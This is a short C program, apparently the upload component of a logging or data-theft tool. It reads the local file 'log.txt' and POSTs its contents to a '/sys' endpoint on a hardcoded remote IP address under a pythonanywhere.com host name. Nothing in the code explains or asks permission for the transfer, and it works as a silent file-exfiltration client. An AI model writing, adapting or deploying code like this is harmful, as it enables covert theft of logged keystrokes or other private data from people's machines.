#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>

#define BUFFER_SIZE (1024 * 10)
#define SOCKET_PORT 80

typedef struct sockaddr_in local_socket_addr_t;
typedef struct sockaddr socket_addr_t;

int client_socket;

void handle_sigint(int sig) {
    printf("Caught signal %d\n", sig);
    if (client_socket >= 0) {
        close(client_socket);
        printf("Socket closed\n");
    }
    exit(0);
}

char *make_request(const char *request) {
    local_socket_addr_t client_addr;
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(SOCKET_PORT);
    inet_pton(AF_INET, "35.173.69.207", &(client_addr.sin_addr));
    int ret = connect(client_socket, (socket_addr_t *)&client_addr, sizeof(local_socket_addr_t));
    if (ret < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    ret = write(client_socket, request, strlen(request));
    if (ret < 0) {
        perror("write");
        exit(EXIT_FAILURE);
    }

    char *response_buffer = (char *)malloc(BUFFER_SIZE);
    if (response_buffer == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    ret = read(client_socket, response_buffer, BUFFER_SIZE - 1);
    if (ret < 0) {
        perror("read");
        exit(EXIT_FAILURE);
    }
    response_buffer[ret] = '\0';

    close(client_socket);
    client_socket = -1;

    return response_buffer;
}

void ReadFromFile(char *str, const char *file_path) {
    FILE *file = fopen(file_path, "r");
    if (file == NULL) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    if (file_size == -1) {
        perror("ftell");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_SET);
    size_t read_size = fread(str, 1, BUFFER_SIZE - 1, file);
    if (read_size == 0) {
        perror("fread");
        exit(EXIT_FAILURE);
    }
    str[read_size] = '\0';

    fclose(file);
}

int main() {
    signal(SIGINT, handle_sigint);

    char buffer2[BUFFER_SIZE];
        char data_buffer[BUFFER_SIZE];
        ReadFromFile(data_buffer, "log.txt");

    // Construct POST request dynamically with the read data
    char request2[BUFFER_SIZE * 2];
    snprintf(request2, BUFFER_SIZE * 2,
                "POST /sys HTTP/1.1\r\n"
                "Host: mohanad012.pythonanywhere.com\r\n"
                "Connection: close\r\n"
                "User-Agent: CustomClient/1.0\r\n"
                "Accept: */*\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: %zu\r\n"
                "\r\n"
                "data=%s",
                strlen(data_buffer) + 5, data_buffer); 

    printf("Sending Request:\n%s\n", request2);

    char *response = make_request(request2);
    printf("Server Response:\n%s\n", response);

    free(response);

    sleep(1);

    return 0;
}

